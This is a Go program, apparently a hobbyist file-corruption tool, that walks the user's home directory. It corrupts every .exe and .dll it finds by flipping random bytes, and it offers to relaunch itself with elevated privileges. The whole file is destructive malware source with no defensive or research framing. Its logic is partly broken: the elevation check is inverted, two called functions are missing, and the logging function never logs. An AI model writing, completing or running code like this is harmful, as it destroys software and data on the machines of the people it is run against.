package main

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

func isWindows() bool {
	return strings.Contains(os.Getenv("OS"), "Windows")
}

func isLinux() bool {
	return strings.Contains(os.Getenv("OS"), "Linux")
}

func loggingSystem(message string) {
	//create a log file
	file, err := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	//set the logger to write to the file
	log.SetOutput(file)
}

func corrupt(wg *sync.WaitGroup, fileChan <-chan string) {
	defer wg.Done()
	for file := range fileChan {
		fmt.Printf("Actively Scanning: %s\n", file)
	}
}

func walkAndSendFiles(root string, fileChan chan<- string) error {
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Println("Walk error:", err)
			return nil
		}
		// remove if neccessary(i did this cause of my system)
		if info.IsDir() {
			if runtime.GOOS == "linux" && strings.Contains(path, ".wine") {
				loggingSystem("passed .wine folder")
				return filepath.SkipDir
			}
			if runtime.GOOS == "linux" && strings.Contains(path, ".var") {
				loggingSystem("passed .var folder")
				return filepath.SkipDir
			}
			return nil // skip folders
		}

		if strings.HasSuffix(path, ".exe") {
			return func() error {
				status, err := realCorrupt(path)
				fmt.Println("Currently corrupting file:", path)
				fmt.Println("Corruption status: ", status)
				if err != nil {
					return err
				}

				return nil
			}()
		}

		if strings.HasSuffix(path, ".dll") {
			return func() error {
				status, err := realCorrupt(path)
				fmt.Println("Corruption status: ", status)
				if err != nil {
					return err
				}

				return nil
			}()
		}

		fileChan <- path
		return nil
	})

	if err != nil {
		fmt.Printf("error walking the path %q: %v\n", root, err)
		//	loggingSystem()
	}
	return err
}

func realCorrupt(filePath string) (status string, err error) {
	// read the file
	data, err := os.ReadFile(filePath)
	if err != nil {
		return "", err
	}

	rand.Seed(time.Now().UnixNano())

	// declaring how many bytes to flip
	count := max(1, len(data)/202)

	for _ = range count {
		pos := rand.Intn(len(data))
		data[pos] ^= 0xFF // flip all bits in this byte
	}

	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		return "", err
	}

	return "corrupted successfully", nil
}

func defaultRoot() string {
	// windows system
	if runtime.GOOS == "windows" {
		home := os.Getenv("USERPROFILE")
		if home != "" {
			return home
		}
		return "C:\\"
	}

	// unix-like system
	home := os.Getenv("HOME")
	if home != "" {
		return home
	}
	return "/home"
}

func main() {
	rootDir := defaultRoot()
	fileChan := make(chan string, 100)

	//check elevation
	elevated, err := IsElevated()
	if err != nil {
		fmt.Fprintln(os.Stderr, "failed to check elevation:", err)
	} else if elevated {
		fmt.Println("Not running as admin")
		fmt.Println("Relaunch elevated now ? [y/N]: ")
		var resp string
		fmt.Scanln(&resp)
		if resp == "y" || resp == "Y" {
			if err := RelaunchElevated(); err != nil {
				fmt.Fprintln(os.Stderr, "failed to relaunch elevated:", err)
				os.Exit(1)
			}
			// Relaunched process will take over; exit current
			os.Exit(0)
		}
		fmt.Println("Continuing without elevation (some features may be disabled).")
	} else {
		fmt.Println("Running elevated — proceed with privileged operations if needed.")
	}

	var wg sync.WaitGroup

	// Spawn multiple goroutines to handle file corruption in parallel
	numWorkers := 10
	for _ = range numWorkers {
		wg.Add(1)
		go corrupt(&wg, fileChan)
	}

	// Walk through all directories and send files to be corrupted
	walkAndSendFiles(rootDir, fileChan)

	close(fileChan) // Close channel after sending is done
	wg.Wait()       // Wait for all corruption workers to finish
}
